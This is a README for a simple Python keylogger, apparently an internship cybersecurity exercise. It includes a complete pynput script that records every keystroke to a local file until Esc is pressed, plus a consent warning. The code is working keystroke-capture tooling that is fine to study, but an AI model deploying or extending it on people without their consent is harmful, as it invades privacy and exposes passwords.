# Simple Keylogger

This Python script implements a basic keylogger that records and logs keystrokes. It captures keys pressed by the user and saves them to a specified file (`keylog.txt` by default). It is essential to handle ethical considerations and permissions responsibly when working with keyloggers.

## Features

- **Keystroke Logging**: Records each keystroke (including special keys) and logs them to a text file.
- **Graceful Exit**: Stops logging when the `Esc` key is pressed.
- **Error Handling**: Handles different types of key events gracefully using `pynput.keyboard`.

## Requirements

- Python 3.x
- Libraries: pynput

## Installation

1. Install the required libraries using pip:

   ```bash
   pip install pynput
   ```

2. Clone the repository or download the `keylogger.py` script.

## Usage

1. Run the `keylogger.py` script:

   ```bash
   python keylogger.py
   ```

2. Start typing. The keylogger will start recording keystrokes and save them to `keylog.txt`.

3. To stop the keylogger, press the `Esc` key.

## Notes

- **Ethical Considerations**: Ensure that you have explicit permission to use a keylogger, as logging keystrokes without consent may violate privacy laws.
- **File Security**: Store and handle the log file (`keylog.txt`) securely, as it contains sensitive information.
- **Customization**: Modify the script as needed to suit specific requirements, such as changing the log file path or adding additional logging functionality.

## Example

```python
from pynput import keyboard

log_file_path = "keylog.txt"
keys = []

def on_press(key):
    try:
        keys.append(key.char)
        with open(log_file_path, "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        keys.append(str(key))
        with open(log_file_path, "a") as log_file:
            log_file.write(f" [{str(key)}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## Acknowledgements

This project was created with the support of [Prodigy InfoTech].

## License

This project is licensed under the MIT License - see the LICENSE file for details.


# PRODIGY_CS_04
